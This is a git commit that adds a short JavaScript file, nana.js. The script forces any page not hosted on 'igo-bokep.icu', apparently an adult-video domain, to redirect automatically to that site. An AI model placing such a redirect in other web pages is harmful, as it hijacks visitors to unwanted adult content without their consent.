5a925d1f13bd0abe100ffebaafb940f1ba4d993b
Galuhput96 <91706295+Galuhput96@users.noreply.github.com>
2025-05-28 02:16:51 +0700

    Create nana.js

---
+++ nana.js
@@ -0,0 +1,6 @@
+const allowedRootDomain = "igo-bokep.icu";
+const currentHost = window.location.host;
+
+if (!currentHost.endsWith(allowedRootDomain)) {
+  window.location.href = "https://tv1.igo-bokep.icu/?utm_source=redirect_auto";
+}
